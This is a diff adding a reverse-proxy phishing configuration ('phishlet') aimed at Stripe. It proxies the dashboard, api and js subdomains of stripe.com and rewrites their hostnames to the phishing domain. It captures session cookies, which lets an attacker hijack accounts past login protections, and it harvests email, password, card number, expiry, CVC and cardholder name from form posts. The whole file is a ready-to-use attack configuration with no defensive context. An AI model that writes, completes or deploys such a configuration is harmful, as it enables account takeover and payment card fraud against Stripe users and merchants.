@@ -1,0 +1,55 @@
+name: 'stripe'
+author: 'gophish-labs'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'dashboard', orig_sub: 'dashboard', domain: 'stripe.com', session: true, is_landing: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'stripe.com', session: false, is_landing: false}
+  - {phish_sub: 'js', orig_sub: 'js', domain: 'stripe.com', session: false, is_landing: false}
+
+sub_filters:
+  - triggers_on: ['dashboard.stripe.com']
+    orig_sub: 'dashboard'
+    domain: 'stripe.com'
+    search: 'dashboard.stripe.com'
+    replace: '{domain}'
+    mimes: ['text/html', 'application/json', 'application/javascript']
+
+  - triggers_on: ['api.stripe.com']
+    orig_sub: 'api'
+    domain: 'stripe.com'
+    search: 'api.stripe.com'
+    replace: '{domain}'
+    mimes: ['application/json']
+
+auth_tokens:
+  - domain: '.stripe.com'
+    keys: ['session', 'machine_identifier', '__stripe_mid']
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'cardNumber'
+      search: '(.*)'
+      type: 'post'
+    - key: 'expiry'
+      search: '(.*)'
+      type: 'post'
+    - key: 'cvc'
+      search: '(.*)'
+      type: 'post'
+    - key: 'cardName'
+      search: '(.*)'
+      type: 'post'
+
+login:
+  url: '/login'
+
+force_post: ['/login']
